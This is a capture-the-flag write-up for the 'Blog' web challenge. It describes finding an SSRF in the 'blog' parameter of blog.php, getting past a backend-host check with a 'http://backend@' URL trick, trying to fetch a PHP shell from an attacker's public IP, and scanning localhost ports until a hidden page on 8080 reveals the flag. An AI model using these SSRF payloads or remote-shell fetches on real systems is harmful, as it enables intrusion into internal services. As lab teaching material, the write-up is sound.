## Blog

### Description

It seems that WebTopia deployed a blog for all its inhabitants. Can you investigate on it ?

**Author: algorab**

### Solution
We have a Blog webpage that includes some links to posts. 
We intercept the requests with Burp and we can see that, for instance, when we click on the first link, a GET request is made to `/blog.php?blog=1`.
Hence, we try manipulating the parameter `blog` by making the following requests :  
* `GET /blog.php?blog=4` returns null so we indeed have only 3 blog posts
* `GET /blog.php?blog[]=1` gives an error that the parameter has to be a string not an array.
* `GET /blog.php?blog=1'` and `GET /blog.php?blog=1"` return `{"error":"Invalid ID"}` so probably an SQL injection is not possible.
* `GET /blog.php?blog=http://www.google.com` returns the <b>Warning</b>: Request should only be sent to <b>backend</b> host. So it is an [SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery).      

Let's go down this path.
We try other URLs by making requests such as `GET /blog.php?blog=http://localhost` for instance. But the same error persists. 
However, when we make a GET request to `/blog.php?blog=http://backend` we obtain the error `Invalid ID`. Therefore, our request was ran indeed.   

The first reflex we had here was to expose a PHP shell code on a public IP in order to execute code remotely. 
The request we made was the following : `/blog.php?blog=http://backend@<Public attacker IP>/shell.php.`
We can see that the GET request was successfully made as we see it on the logs of our server, but the shellcode is actually echoed and not executed. 
So, we cannot RCE like this, but maybe we can check what is on the server.
We make the following GET request `/blog.php?blog=http://backend@localhost` but it returns nothing.


We run Gobuster to check the subdirectories, but none of `/blog.php?blog=http://backend@localhost/.htaccess` or `/blog.php?blog=http://backend@localhost/.htpasswd` returns a result.    

We try to check other ports, maybe something else exposed on the server, so we kind of bruteforce by making several requests like this `GET /blog.php?blog=http://backend@localhost:<port>`.
By making the following GET request `GET /blog.php?blog=http://backend@localhost:8080`, we obtain the hidden webpage which includes the flag.

### Flag

`N0PS{S5rF_1s_Th3_n3W_W4y}`